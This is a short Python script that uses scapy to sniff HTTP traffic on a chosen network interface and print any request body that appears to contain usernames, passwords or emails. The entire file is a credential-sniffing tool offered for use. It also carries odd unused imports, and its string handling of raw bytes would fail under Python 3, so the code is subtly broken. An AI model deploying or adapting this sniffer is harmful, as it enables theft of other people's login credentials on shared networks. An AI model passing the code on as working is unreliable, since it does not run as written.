#!/usr/bin/env python

from pickle import FALSE
from click import argument
from py import process
import scapy.all as scapy
import argparse
from scapy.layers import http

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    return arguments.interface

def sniff(iface):
    scapy.sniff(iface=iface, store=FALSE, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] Http Request >> " + packet[http.HTTPRequest].host + packet[http.HTTPRequest].Path)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print("[+] Possible Username/Password : " + load)
                    break


iface = get_interface()
sniff(iface)

